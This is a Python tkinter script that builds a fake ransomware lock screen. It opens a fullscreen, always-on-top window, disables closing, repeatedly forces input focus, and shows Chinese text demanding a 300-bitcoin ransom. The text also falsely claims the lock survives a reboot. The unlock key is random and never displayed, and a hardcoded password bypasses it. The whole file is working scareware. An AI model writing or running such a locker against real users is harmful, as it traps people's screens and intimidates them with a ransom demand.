import tkinter as tk
import random
from PIL import Image, ImageTk

def check_input():
    check=enter.get()
    if check==key:
        root.destroy()
    elif check=="omgisfrank":
        root.destroy()
    else:
        wrong=tk.Label(text="wrong key",bg="black", fg="red")
        wrong.place(x=100,y=470)
        root.after(3000, lambda: clear_wrong_label(wrong))
root = tk.Tk()
def clear_wrong_label(label):
    label.destroy()
root.title("Locker")
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")# 先設置全螢幕大小
root.attributes('-fullscreen', True)  # 設為全屏
root.attributes('-topmost', True)  # 設為最上層
root.protocol("WM_DELETE_WINDOW", lambda: None)  # 禁用關閉按鈕
#root.overrideredirect(True)  # 去掉框
#輸入密鑰
enter=tk.Entry()
enter.place(x=100,y=400)
# 強制搶回鍵盤和滑鼠焦點
root.focus_force()
root.update_idletasks()  # 先更新一下
root.after(100, lambda: root.focus_force())  # 延遲強化搶回焦點
# 必要的額外強化
def force_focus():
    root.focus_force()
    enter.focus_set()  # 強制讓輸入框拿到輸入焦點
    root.after(100, force_focus)  # 每100毫秒重複一次，防止焦點丟失
force_focus()  # 啟動焦點強化
# 建立close按鈕(測試時用 正式板時沒有)
btn = tk.Button(root, text='close',command=root.destroy)
#btn.place(x=100,y=500)# 加入視窗中
btn.lift()
#圖片
# 讀取圖片
img = Image.open("/home/zathan/桌面/screen locker/black-black-and-white-anonymous-hackers-wallpaper-preview.jpg")

# 取得螢幕解析度
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# 調整圖片大小
img = img.resize((screen_width, screen_height), Image.LANCZOS)

# 轉換成 PhotoImage
photo = ImageTk.PhotoImage(img)

# 設定Label為背景（用新的 photo）
bg_label = tk.Label(root, image=photo)
bg_label.place(x=0, y=0, relwidth=1, relheight=1)
bg_label.lower()  # 把背景圖層降到最下面，其他元件才看得到


#文字


a = tk.Label(root, 
             text="我的電腦出了什麼問題？", 
             bitmap="questhead", 
             compound="left", 
             font=("Arial", 40, "bold"), 
             bg="black", 
             fg="white")
a.place(x=100, y=50)  # 第一行

b = tk.Label(root, 
             text="你的螢幕被鎖住了 不能切換去其他視窗或關掉現在這個「病毒」 \n(就算重開機也一樣)", 
             font=("Arial", 30), 
             bg="black", 
             fg="white")
b.place(x=100, y=150)  # 第二行

c = tk.Label(root, 
             text="有沒有恢復的方法？", 
             bitmap="questhead", 
             compound="left", 
             font=("Arial", 40, "bold"), 
             bg="black", 
             fg="white")
c.place(x=100, y=250)  # 第三行

d = tk.Label(root, 
             text="支付300比特幣贖金 取得密鑰才能解鎖 否則你會「wanna cry」", 
             font=("Arial", 30), 
             bg="black", 
             fg="white")
d.place(x=100, y=350)  # 第四行
word = tk.Label(text="<--輸入密鑰", font=("Arial", 20, "bold"),bg="black", fg="white")
word.place(x=300,y=400)

#密鑰
      #0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25
atoz=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
key=""
for i in range(0,3):
    random_num=str(random.randint(0,9))
    random_word=random.randint(0,25)
    port_of_key_word=atoz[random_word]
    key=key+port_of_key_word+random_num
word2=tk.Label(text=key)
#word2.pack()
#確認按鈕
check_btn=tk.Button(text="確認:D",command=check_input)
check_btn.place(x=100,y=430)
# 強制搶焦點
def force_focus():
    root.focus_force()
    enter.focus_set()
    root.after(100, force_focus)

# 延遲讓畫面先完全建立後再開始強制搶焦點
root.after(500, force_focus)
root.mainloop()